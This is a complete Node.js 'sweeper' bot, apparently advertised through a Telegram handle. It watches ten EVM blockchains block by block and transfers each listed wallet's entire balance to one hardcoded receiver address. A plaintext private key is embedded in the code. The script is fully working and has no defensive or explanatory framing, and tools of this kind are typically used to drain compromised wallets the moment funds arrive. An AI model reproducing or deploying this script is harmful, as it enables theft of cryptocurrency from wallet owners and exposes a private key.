const { ethers } = require("ethers");

// Receiver address
const addressReceiver = "0x422B0755EABeA90Cc2C5674F8Bba65C861962fdD";

// Your wallets
const privateKeys = [
    "8730eff6d733322e03966f70ba1b37b8f9503dc483644862de0d8bca54c9eb2d",
];

// 10 EVM Networks
const RPC_URLS = {
    ethereum: "https://rpc.ankr.com/eth",
    bsc: "https://bsc-dataseed.binance.org",
    polygon: "https://polygon-rpc.com",
    avalanche: "https://api.avax.network/ext/bc/C/rpc",
    fantom: "https://rpcapi.fantom.network",
    arbitrum: "https://arb1.arbitrum.io/rpc",
    optimism: "https://mainnet.optimism.io",
    base: "https://mainnet.base.org",
    celo: "https://forno.celo.org",
    cronos: "https://evm.cronos.org",
};

const GAS_LIMIT = 21000;

async function watchNetwork(name, rpcUrl) {
    const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    provider.on("block", async (blockNumber) => {
        console.log(`📦 [${name}] New block: ${blockNumber}`);
        for (const pk of privateKeys) {
            const wallet = new ethers.Wallet(pk, provider);
            const address = await wallet.getAddress();
            try {
                const balance = await provider.getBalance(address);
                const gasPrice = await provider.getGasPrice();
                const fee = gasPrice.mul(GAS_LIMIT);

                if (balance.gt(fee)) {
                    const amount = balance.sub(fee);
                    const tx = await wallet.sendTransaction({
                        to: addressReceiver,
                        value: amount,
                        gasPrice,
                        gasLimit: GAS_LIMIT,
                    });
                    console.log(`✅ [${name}] Sent ${ethers.utils.formatEther(amount)} from ${address}`);
                    console.log(`🔗 Tx: ${tx.hash}`);
                } else {
                    console.log(`⚠️ [${name}] Not enough balance in ${address}`);
                }
            } catch (e) {
                console.log(`❌ [${name}] Error: ${e.message}`);
            }
        }
    });
}

// Start watching all networks
for (const [name, rpcUrl] of Object.entries(RPC_URLS)) {
    watchNetwork(name, rpcUrl);
}


// Auto withdraw crypto bot for 10 EVM Networks
// Telegram: @autoboyt
